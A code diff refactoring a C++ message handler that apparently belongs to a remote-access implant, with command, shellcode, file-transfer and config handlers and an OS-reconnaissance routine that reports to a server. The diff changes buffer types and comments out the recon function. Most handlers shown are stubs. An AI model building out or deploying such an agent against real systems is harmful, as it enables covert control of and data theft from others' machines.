@@ -27,7 +27,7 @@ MessageHandler::~MessageHandler()
 	// debug statement
 }
 
-bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
+bool MessageHandler::executeCommand(RawByteBuffer& data)
 {
 	std::cout << "executeCommand: " << byte2string(data).c_str() << std::endl;
 
@@ -170,30 +170,31 @@ bool MessageHandler::executeShellcode(InternalMessage& msg)
 }*/
 
 
-bool MessageHandler::downloadFile(std::vector<uint8_t>& data)
+bool MessageHandler::downloadFile(RawByteBuffer& data)
 {
 	std::cout << "downloadFile" << std::endl;
 	return false;
 }
 
-bool MessageHandler::uploadFile(std::vector<uint8_t>& data)
+bool MessageHandler::uploadFile(RawByteBuffer& data)
 {
 	std::cout << "uploadFile" << std::endl;
 	return false;
 }
 
-bool MessageHandler::updateConfig(std::vector<uint8_t>& data)
+bool MessageHandler::updateConfig(RawByteBuffer& data)
 {
 	std::cout << "updateConfig" << std::endl;
 	return false;
 }
 
-bool MessageHandler::handleServerError(std::vector<uint8_t>& data)
+bool MessageHandler::handleServerError(RawByteBuffer& data)
 {
 	std::cout << "handleServerError" << std::endl;
 	return false;
 }
 
+/*
 bool MessageHandler::systemInfo(InternalMessage& msg)
 {
 	std::cout << "systemInfo" << std::endl; 
@@ -201,17 +202,15 @@ bool MessageHandler::systemInfo(InternalMessage& msg)
 	//ZeroMemory(msg, sizeof(ReconMessage)); 
 
 	// OS Version Info 
-	/*
-	OSVERSIONINFOEX osInfo; 
-	osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX); 
-	if (GetVersionEx((OSVERSIONINFO*)&osInfo)) 
-	{ 
-		rMsg.dwMajorVersion = osInfo.dwMajorVersion;
-		rMsg.dwMinorVersion = osInfo.dwMinorVersion;
-		rMsg.dwBuildNumber = osInfo.dwBuildNumber;
-		rMsg.wProductType = osInfo.wProductType;
-	} 
-	*/
+	//OSVERSIONINFOEX osInfo; 
+	//osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX); 
+	//if (GetVersionEx((OSVERSIONINFO*)&osInfo)) 
+	//{ 
+		//rMsg.dwMajorVersion = osInfo.dwMajorVersion;
+		//rMsg.dwMinorVersion = osInfo.dwMinorVersion;
+		//rMsg.dwBuildNumber = osInfo.dwBuildNumber;
+		//rMsg.wProductType = osInfo.wProductType;
+	//} 
 	///
 	typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
 	HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
@@ -293,12 +292,12 @@ bool MessageHandler::systemInfo(InternalMessage& msg)
 	bool sendResult = transportLayer_->sendMessage(outMsg); 
 	return sendResult; 
 
-}
+}*/
 
 // TODO: something about this function corruprts the memory
 void MessageHandler::processMessage(InternalMessage& msg)
 {
-	systemInfo(msg);
+	//systemInfo(msg);
 	switch (msg.header.messageType)
 	{
 	case MessageType::EXECUTE_COMMAND:
@@ -342,12 +341,12 @@ void MessageHandler::setTransportLayer(TransportLayer& transportLayer)
 	transportLayer_ = &transportLayer;
 }
 
-std::vector<uint8_t> MessageHandler::string2byte(std::string& inMsg)
+RawByteBuffer MessageHandler::string2byte(std::string& inMsg)
 {
-	return std::vector<uint8_t>(inMsg.begin(), inMsg.end());
+	return RawByteBuffer(inMsg.begin(), inMsg.end());
 }
 
-std::string MessageHandler::byte2string(std::vector<uint8_t>& inMsg)
+std::string MessageHandler::byte2string(RawByteBuffer& inMsg)
 {
 	return std::string(inMsg.begin(), inMsg.end());
 }
